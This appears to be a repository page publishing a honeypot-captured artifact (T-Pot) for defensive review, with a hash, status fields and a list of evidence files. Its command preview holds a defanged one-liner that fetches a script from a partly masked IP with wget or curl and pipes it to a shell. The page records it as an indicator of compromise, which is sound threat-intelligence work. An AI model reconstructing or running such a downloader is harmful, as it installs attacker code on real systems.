# 6ff9ee99a3c4362e9a9b48a4650a3466e9f73a4bf21e69bc25cfb76d612ec274

High-signal T-Pot artifact published for human review.

## Summary

| Field | Value |
|---|---|
| SHA256 | `6ff9ee99a3c4362e9a9b48a4650a3466e9f73a4bf21e69bc25cfb76d612ec274` |
| Source | T-Pot / Oraculo SOC legacy review |
| Status | high-signal candidate |
| Evidence | commands, iocs, metadata |

## Why it is visible

This artifact matched useful defensive signals such as downloader behavior, command execution, IOC presence, metadata, or detection notes.

It is published here so the repository shows the actual observed volume instead of hiding everything behind a summary.

## Command preview

```text
(wget --no-check-certificate -qO- hxxps://217[.]60[.]195[.]XXX/sh || curl -sk hxxps://217[.]60[.]195[.]XXX/sh) | sh -s apache[.]selfre
```

## Evidence files

- `evidence/commands.defanged.txt`
- `evidence/iocs.defanged.json`
- `metadata/metadata.json`
- `detections.md`

Some files may be absent when the original artifact did not include that specific evidence type.

## Safety

Commands and IOCs are defanged for public defensive review. Do not execute captured payload material.
